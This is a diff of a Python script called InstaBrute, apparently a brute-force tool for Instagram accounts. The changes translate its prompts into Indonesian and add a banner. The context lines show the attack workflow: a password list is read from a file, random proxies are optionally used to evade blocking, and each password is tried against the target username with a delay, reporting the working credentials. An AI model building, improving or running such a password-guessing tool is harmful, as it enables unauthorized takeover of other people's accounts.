@@ -3,7 +3,7 @@ TODO LIST:
 	Fix and make proxy function better
 	Sort code again
 	Add help function to all "Yes/no" questions
-	Add help  function to "Press enter to exit input"
+	Add help  function to "Tekan enter untuk keluar input"
 '''
 import requests
 import json
@@ -11,6 +11,9 @@ import time
 import os
 import random
 import sys
+
+os.system("clear")	
+os.system("figlet InstaBrute DSFS")
 
 #Help function
 def Input(text):
@@ -35,7 +38,7 @@ class Instabrute():
 		self.IsUserExists()
 
 
-		UsePorxy = Input('[*]Mau pakai proxy ? (y/n): ').upper()
+		UsePorxy = Input('[*] Mau pakai proxy ? (y/n): ').upper()
 		if (UsePorxy == 'Y' or UsePorxy == 'YES'):
 			self.randomProxy()
 
@@ -47,14 +50,14 @@ class Instabrute():
 				self.passwords = f.read().splitlines()
 				passwordsNumber = len(self.passwords)
 				if (passwordsNumber > 0):
-					print ('[*] %s Passwords loads successfully' % passwordsNumber)
+					print ('[*] %s Password sukses di muat :)' % passwordsNumber)
 				else:
-					print('Password file are empty, Please add passwords to it.')
-					Input('[*] Press enter to exit')
+					print('File password kosong :(, Tolong tambah password di situ.')
+					Input('[*] Tekan enter untuk keluar')
 					exit()
 		else:
-			print ('Please create passwords file named "%s"' % self.passwordsFile)
-			Input('[*] Press enter to exit')
+			print ('Tolong untuk membuat file password bernama "%s"' % self.passwordsFile)
+			Input('[*] Tekan enter untuk keluar')
 			exit()
 
 	#Choose random proxy from proxys file
@@ -154,7 +157,7 @@ for password in instabrute.passwords:
 	if sess:
 		print ('[*] Login sukses %s' % [instabrute.username,password])
 	else:
-		print ('[*] Password salah, sabar [%s]' % password)
+		print ('[*] Password salah, harap sabar [%s]' % password)
 
 	try:
 		time.sleep(delayLoop)
